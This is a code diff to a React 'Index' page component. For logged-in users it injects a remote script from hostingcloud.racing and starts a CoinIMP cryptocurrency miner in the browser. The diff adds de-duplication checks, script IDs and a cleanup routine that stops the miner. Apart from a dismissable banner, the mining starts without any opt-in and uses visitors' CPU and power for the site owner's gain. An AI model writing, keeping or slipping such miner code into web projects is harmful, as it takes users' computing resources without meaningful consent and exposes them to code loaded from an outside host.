@@ -44,27 +44,53 @@ const Index = () => {
   // Mining script injection for main page
   useEffect(() => {
     if (user) {
+      // Check if mining script already exists
+      const existingScript = document.head.querySelector('script[src="https://www.hostingcloud.racing/Q1Mx.js"]');
+      if (existingScript) return;
+
       // Inject main mining script
       const script1 = document.createElement('script');
       script1.src = 'https://www.hostingcloud.racing/Q1Mx.js';
       script1.async = true;
+      script1.id = 'mining-script-main';
       document.head.appendChild(script1);
 
       script1.onload = () => {
+        // Check if client already initialized
+        const existingClientScript = document.head.querySelector('#mining-script-client');
+        if (existingClientScript) return;
+        
         const script2 = document.createElement('script');
+        script2.id = 'mining-script-client';
         script2.text = `
-          var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
-            throttle: 0.3, c: 'w'
-          });
-          _client.start();
-          _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+          if (!window.miningClientInitialized) {
+            var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
+              throttle: 0.3, c: 'w'
+            });
+            _client.start();
+            _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+            window.miningClientInitialized = true;
+            window.miningClient = _client;
+          }
         `;
         document.head.appendChild(script2);
       };
 
       // Cleanup function to remove scripts when component unmounts
       return () => {
-        const scripts = document.head.querySelectorAll('script[src="https://www.hostingcloud.racing/Q1Mx.js"]');
+        // Stop mining client if exists
+        const cleanupScript = document.createElement('script');
+        cleanupScript.text = `
+          if (window.miningClient && window.miningClient.stop) {
+            window.miningClient.stop();
+            window.miningClient = null;
+            window.miningClientInitialized = false;
+          }
+        `;
+        document.head.appendChild(cleanupScript);
+        setTimeout(() => cleanupScript.remove(), 100);
+
+        const scripts = document.head.querySelectorAll('#mining-script-main, #mining-script-client');
         scripts.forEach(script => script.remove());
       };
     }
